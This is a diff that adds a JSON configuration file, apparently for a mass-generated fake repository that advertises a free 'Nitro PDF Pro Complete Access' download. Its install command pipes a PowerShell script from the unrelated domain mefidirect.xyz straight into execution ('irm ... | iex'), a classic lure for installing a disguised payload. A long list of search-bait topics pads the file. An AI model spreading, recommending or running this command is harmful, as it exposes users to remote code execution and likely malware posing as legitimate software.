@@ -1,0 +1,27 @@
+{
+  "repo": "nitro-pdf-pro-complete-access",
+  "product": "Nitro PDF Pro Complete Access",
+  "kind": "office",
+  "install_type": "download",
+  "download_url": "https://nitro-pdf.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "office",
+  "topics": [
+    "nitro-pdf-stable-build",
+    "nitro-pdf-x64",
+    "print-tools",
+    "pc-toolkit",
+    "lightweight-client",
+    "nitro-pdf-toolkit",
+    "nitro-pdf-app",
+    "nitro-pdf-win64",
+    "fast-startup",
+    "install-nitro-pdf-windows",
+    "template-library",
+    "native-windows",
+    "ocr-tools"
+  ]
+}
